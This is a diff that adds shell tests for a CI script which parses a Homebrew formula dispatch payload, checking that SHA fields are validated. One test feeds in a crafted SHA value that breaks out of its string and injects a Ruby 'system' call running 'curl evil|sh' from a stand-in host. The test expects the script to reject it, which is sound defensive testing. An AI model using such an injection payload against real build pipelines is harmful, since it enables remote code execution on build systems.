@@ -49,3 +49,19 @@ teardown() {
 	[ "$status" -eq 1 ]
 	[[ "$output" == *"Invalid version"* ]]
 }
+
+@test "parse-dispatch-payload: rejects binary-assets sha with ruby injection payload" {
+	export CLIENT_PAYLOAD='{"formula":"lintro","version":"1.0.0","binary-assets":{"arm64-sha":"deadbeef\"\n    system \"curl evil|sh\"\n    sha256 \"x","x86-sha":"fdab37737c071fb07543c5fd2f99a36bb3031524ba7a25b6bd63aa333bed12f5"}}'
+
+	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
+	[ "$status" -eq 1 ]
+	[[ "$output" == *"Invalid arm64-sha"* ]]
+}
+
+@test "parse-dispatch-payload: accepts valid 64-char hex binary-assets shas" {
+	export CLIENT_PAYLOAD='{"formula":"lintro","version":"1.0.0","binary-assets":{"arm64-sha":"a4c1663e5908757746676c9a48bdc35a4d0ef4dbaa3bd6a96dd3a29c0a0d4c10","x86-sha":"fdab37737c071fb07543c5fd2f99a36bb3031524ba7a25b6bd63aa333bed12f5"}}'
+
+	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
+	[ "$status" -eq 0 ]
+	grep -q '^binary-assets<<EOF$' "$GITHUB_OUTPUT"
+}
